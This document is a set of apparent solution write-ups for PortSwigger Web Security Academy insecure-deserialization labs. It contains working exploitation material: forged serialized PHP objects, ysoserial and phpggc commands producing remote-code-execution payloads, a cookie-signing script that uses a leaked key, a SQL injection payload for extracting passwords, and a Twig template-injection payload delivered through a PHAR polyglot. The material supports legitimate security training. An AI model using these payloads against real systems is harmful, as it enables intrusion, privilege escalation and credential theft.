# Insecure deserialization

## Modifying serialized objects

### Description

[This lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects) uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. 

### Reproduction and proof of concept

1. Log in using your own credentials. Notice that the post-login `GET /my-account` request contains a session cookie that appears to be URL and Base64-encoded.
2. Use Burp's Inspector panel to study the request in its decoded form. Notice that the cookie is in fact a serialized PHP object. The admin attribute contains `b:0`, indicating the boolean value false. Send this request to Burp Repeater.
3. In Burp Repeater, use the Inspector to examine the cookie again and change the value of the admin attribute to b:1. Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.
4. Send the request. Notice that the response now contains a link to the admin panel at `/admin`, indicating that you have accessed the page with admin privileges.
5. Change the path of your request to `/admin` and resend it. Notice that the `/admin` page contains links to delete specific user accounts.
6. Change the path of your request to `/admin/delete?username=carlos` and send the request to solve the lab.

### Exploitability

An attacker will need to log in to `wiener:peter`; edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges; and delete Carlos's account. 

----

## Modifying serialized data types

### Description

[This lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types) uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. 

### Reproduction and proof of concept

1. Log in using your own credentials. In Burp, open the post-login `GET /my-account` request and examine the session cookie using the Inspector to reveal a serialized PHP object. Send this request to Burp Repeater.
2. In Burp Repeater, use the Inspector panel to modify the session cookie as follows:
* Update the length of the username attribute to `13`.
* Change the username to `administrator`.
* Change the access token to the integer `0`. As this is no longer a string, you also need to remove the double-quotes surrounding the value.
* Update the data type label for the access token by replacing `s` with `i`.

The result should look like this:

```text
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
    
2. Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.
3. Send the request. Notice that the response now contains a link to the admin panel at `/admin`, indicating that you have successfully accessed the page as the administrator user.
4. Change the path of your request to `/admin` and resend it. Notice that the `/admin` page contains links to delete specific user accounts.
5. Change the path of your request to `/admin/delete?username=carlos` and send the request to solve the lab.

### Exploitability

An attacker will need to log in to `wiener:peter`; edit the serialized object in the session cookie to access the administrator account; and delete Carlos. 

----

## Using application functionality to exploit insecure deserialization

### Description

[This lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization) uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object.

### Reproduction and proof of concept

1. Log in to your own account. On the "My account" page, notice the option to delete your account by sending a `POST` request to `/my-account/delete`.
2. Send a request containing a session cookie to Burp Repeater.
3. In Burp Repeater, study the session cookie using the Inspector panel. Notice that the serialized object has an `avatar_link` attribute, which contains the file path to your avatar.
4. Edit the serialized data so that the avatar_link points to `/home/carlos/morale.txt`. Remember to update the length indicator. The modified attribute should look like this:

```text
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
```
    
5. Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.
6. Change the request line to `POST /my-account/delete` and send the request. Your account will be deleted, along with Carlos's `morale.txt` file.

### Exploitability

An attacker will need to log in to `wiener:peter`; and the backup account `gregg:rosebud`; edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory. 

----

## Arbitrary object injection in PHP

### Description

[This lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php) uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. 

### Reproduction and proof of concept

1. Log in to your own account and notice the session cookie contains a serialized PHP object.
2. From the site map, notice that the website references the file `/libs/CustomTemplate.php`. Right-click on the file and select "Send to Repeater".
3. In Burp Repeater, notice that you can read the source code by appending a tilde (`~`) to the filename in the request line.
4. In the source code, notice the `CustomTemplate` class contains the `__destruct()` magic method. This will invoke the `unlink()` method on the `lock_file_path` attribute, which will delete the file on this path.
5. In Burp Decoder, use the correct syntax for serialized PHP data to create a `CustomTemplate` object with the `lock_file_path` attribute set to `/home/carlos/morale.txt`. Make sure to use the correct data type labels and length indicators. The final object should look like this:

```text
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
    
6. Base64 and URL-encode this object and save it to your clipboard.
7. Send a request containing the session cookie to Burp Repeater.
8. In Burp Repeater, replace the session cookie with the modified one in your clipboard.
9. Send the request. The `__destruct()` magic method is automatically invoked and will delete Carlos's file.

### Exploitability

An attacker will need to log in to `wiener:peter`; create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. An attacker will need to obtain source code access to solve this lab. 

----

## Exploiting Java deserialization with Apache Commons

### Description

[This lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons) uses a serialization-based session mechanism and loads the Apache Commons Collections library. 

### Reproduction and proof of concept

1. Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater.
2. Download the [ysoserial](https://github.com/frohoff/ysoserial) tool and execute the following command:

```text
java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```
    
3. This will generate a Base64-encoded serialized object containing your payload.
4. In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it.
5. Send the request to solve the lab.

### Exploitability

Although attackers do not have source code access, they can still exploit this lab using pre-built gadget chains. An attacker will need to log in to `wiener:peter`; use a third-party tool to generate a malicious serialized object containing a remote code execution payload; and pass this object into the website to delete the `morale.txt` file from Carlos's home directory. 

----

## Exploiting PHP deserialization with a pre-built gadget chain

### Description

[This lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain) has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework.

### Reproduction and proof of concept

1. Log in and send a request containing your session cookie to Burp Repeater. Highlight the cookie and look at the Inspector panel.
2. Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.
3. Copy the decoded cookie from the Inspector and paste it into Decoder.
4. In Decoder, highlight the token and then select Decode as -> Base64. Notice that the token is actually a serialized PHP object.
5. In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. However, you should notice that:
* A developer comment discloses the location of a debug file at `/cgi-bin/phpinfo.php`.
* The error message reveals that the website is using the Symfony 4.3.6 framework.
6. Request the `/cgi-bin/phpinfo.php` file in Burp Repeater and observe that it leaks some key information about the website, including the `SECRET_KEY` environment variable. Save this key; you'll need it to sign your exploit later.
7. Download the [phpgcc](https://github.com/ambionics/phpggc) tool and execute the following command:

```text
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```
    
This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's `morale.txt` file.

8. You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:
* Assign the object you generated in `phpgcc` to the `$object` variable.
* Assign the secret key that you copied from the `phpinfo.php` file to the `$secretKey` variable.

```text
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

This will output a valid, signed cookie to the console.

9. In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab.

### Exploitability

Although attackers do not have source code access, they can still exploit this lab using pre-built gadget chains. An attacker will need to log in to `wiener:peter`; identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload; work out how to generate a valid signed cookie containing your malicious object; and pass this into the website to delete the `morale.txt` file from Carlos's home directory. 

----

## Exploiting Ruby deserialization using a documented gadget chain

### Description

[This lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain) uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework. 

### Reproduction and proof of concept

1. Log in to your own account and notice that the session cookie contains a serialized ("marshaled") Ruby object. Send a request containing this session cookie to Burp Repeater.
2. Browse the web to find the U[niversal Deserialisation Gadget for Ruby 2.x-3.x](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) by vakzz on devcraft.io. Copy the final script for generating the payload.
3. Modify the script as follows:
* Change the command that should be executed from id to `rm /home/carlos/morale.txt`.
* Replace the final two lines with `puts Base64.encode64(payload)`. This ensures that the payload is output in the correct format for you to use for the lab.
3. Run the script and copy the resulting Base64-encoded object.
4. In Burp Repeater, replace your session cookie with the malicious one that you just created, then URL encode it.
5. Send the request to solve the lab.

### Exploitability

An attacker will need to log in to `wiener:peter`; find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload; and then pass this object into the website to delete the morale.txt file from Carlos's home directory. 

----

## Developing a custom gadget chain for Java deserialization

### Description

[This lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization) uses a serialization-based session mechanism. By constructing a suitable gadget chain, it is possible to exploit this lab's insecure deserialization to obtain the administrator's password. 

### Reproduction and proof of concept

####  Identify the vulnerability

1. Log in to your own account and notice the session cookie contains a serialized Java object.
2. From the site map, notice that the website references the file `/backup/AccessTokenUser.java`. You can successfully request this file in Burp Repeater.
3. Navigate upward to the `/backup` directory and notice that it also contains a `ProductTemplate.java` file.
4. Notice that the `ProductTemplate.readObject()` method passes the template's id attribute into a SQL statement.
5. Based on the leaked source code, write a small Java program that instantiates a `ProductTemplate` with an arbitrary ID, serializes it, and then Base64-encodes it.

```html
import data.productcatalog.ProductTemplate;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        ProductTemplate originalObject = new ProductTemplate("your-payload-here");

        String serializedObject = serialize(originalObject);

        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized object ID: " + deserializedObject.getId());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```

6. Use the Java program to create a `ProductTemplate` with the `id` set to a single apostrophe. Copy the Base64 string and submit it in a request as your session cookie. The error message confirms that the website is vulnerable to Postgres-based SQL injection via this deserialized object. 

####  Extract the password

Having identified this vulnerability, you now need to find a way to exploit it to extract the administrator's password. At this point, you have the following options for testing different payloads:

* Make changes in your Java file like in the previous step, recompile it, and run it again before pasting the new value into your session cookie. This can be time-consuming as you'll have to repeat all of these steps for each payload you want to test.
* Alternatively, you can use the [Hackvertor extension](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100). You can then paste the raw serialized object into Burp Repeater and add tags that will update the offsets and Base64-encode the object automatically. This makes it much quicker to test a large number of payloads, and is even compatible with Burp Intruder.

This template is Base64-encoded here to avoid copy/paste issues:

```text
PEBiYXNlNjRfND6s7QAFc3IAI2RhdGEucHJvZHVjdGNhdGFsb2cuUHJvZHVjdFRlbXBsYXRlAAAAAAAAAAECAAFMAAJpZHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAA8QGZyb21fY2hhcmNvZGVfMz48QGdldF9sZW4gLz48QC9mcm9tX2NoYXJjb2RlXzM+WU9VUi1QQVlMT0FELUhFUkU8QHNldF9sZW4+PEBsZW5ndGhfMD5ZT1VSLVBBWUxPQUQtSEVSRTxAL2xlbmd0aF8wPjxAL3NldF9sZW4+PEAvYmFzZTY0XzQ+
```

To use this template:

1. Copy and paste it into your session cookie in Burp Repeater.
2. Base64-decode it to reveal something that looks like this:

```text
<@base64_4>¬ísr#data.productcatalog.ProductTemplateLidtLjava/lang/String;xpt<@from_charcode_3><@get_len /><@/from_charcode_3>YOUR-PAYLOAD-HERE<@set_len><@length_0>YOUR-PAYLOAD-HERE<@/length_0><@/set_len><@/base64_4>
```
    
3. Replace both occurrences of YOUR-PAYLOAD-HERE with the payload that you want to test. Leave everything else as it is.
4. Send the request. If you want to check the output that Hackvertor generated, you can look at the request on the "Logger" tab.

There are several ways to extract the password, but for this solution, a simple, error-based UNION attack will suffice.

5. Enumerate the number of columns in the table (8).
6. Determine the data type of the columns and identify that columns 4, 5, and 6 do not expect values of the type string. Importantly, notice that the error message reflects the string input that you entered.
7. List the contents of the database and identify that there is a table called users with a column called password.
8. Use a suitable SQL injection payload to extract the password from the users table. For example, the following payload will trigger an exception that displays the password in the error message:

```text
' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
```
    
9. To solve the lab, log in as administrator using the extracted password, open the admin panel, and delete Carlos's account.

### Exploitability

An attacker will need to log in to `wiener:peter`; gain access to the source code and use it to construct a gadget chain to obtain the administrator's password; and then, log in as the administrator and delete Carlos's account. 

----

## Developing a custom gadget chain for PHP deserialization

### Description

[This lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization) uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. 

### Reproduction and proof of concept

1. Log in to your own account and notice that the session cookie contains a serialized PHP object. Notice that the website references the file `/cgi-bin/libs/CustomTemplate.php`. Obtain the source code by submitting a request using the `.php~` backup file extension.
2. In the source code, notice that the `__wakeup()` magic method for a `CustomTemplate` will create a new Product by referencing the `default_desc_type` and `desc` from the `CustomTemplate`.
3. Also notice that the `DefaultMap` class has the `__get()` magic method, which will be invoked if you try to read an attribute that doesn't exist for this object. This magic method invokes `call_user_func()`, which will execute any function that is passed into it via the `DefaultMap->callback` attribute. The function will be executed on the `$name`, which is the non-existent attribute that was requested.
4. You can exploit this gadget chain to invoke `exec(rm /home/carlos/morale.txt)` by passing in a `CustomTemplate` object where:

```text
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"
```

5. If you follow the data flow in the source code, you will notice that this causes the `Product` constructor to try and fetch the `default_desc_type` from the `DefaultMap` object. As it doesn't have this attribute, the `__get()` method will invoke the callback `exec()` method on the `default_desc_type`, which is set to our shell command.
6. To solve the lab, Base64 and URL-encode the following serialized object, and pass it into the website via the session cookie:

```text
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

### Exploitability

An attacker will need to log in to `wiener:peter`; and delete the `morale.txt` file from Carlos's home directory. 

----

## Using PHAR deserialization to deploy a custom gadget chain

### Description

[This lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain) does not explicitly use deserialization. However, if you combine PHAR deserialization with other advanced hacking techniques, you can still achieve remote code execution via a custom gadget chain. 

### Reproduction and proof of concept

1. Observe that the website has a feature for uploading your own avatar, which only accepts JPG images. Upload a valid JPG as your avatar. Notice that it is loaded using `GET /cgi-bin/avatar.php?avatar=wiener`.
2. In Burp Repeater, request `GET /cgi-bin` to find an index that shows a `Blog.php` and `CustomTemplate.php` file. Obtain the source code by requesting the files using the `.php~` backup extension.
3. Study the source code and identify the gadget chain involving the `Blog->desc` and `CustomTemplate->lockFilePath` attributes.
4. Notice that the `file_exists()` filesystem method is called on the `lockFilePath` attribute.
5. Notice that the website uses the Twig template engine. You can use deserialization to pass in an server-side template injection (SSTI) payload. Find a documented SSTI payload for remote code execution on [Twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig), and adapt it to delete Carlos's file:

```text
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
```

6. Write some PHP for creating a `CustomTemplate` and `Blog` containing your SSTI payload:

```text
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
```

7. Create a [phar-jpg polyglot](https://github.com/kunte0/phar-jpg-polyglot) containing the PHP script. 
8. Upload this file as your avatar.
9. In Burp Repeater, modify the request line to deserialize your malicious avatar using a `phar:// stream` as follows:

```text
GET /cgi-bin/avatar.php?avatar=phar://wiener
```
    
10. Send the request to solve the lab.

### Exploitability

An attacker will need to log in to `wiener:peter`; and delete the `morale.txt` file from Carlos's home directory. 


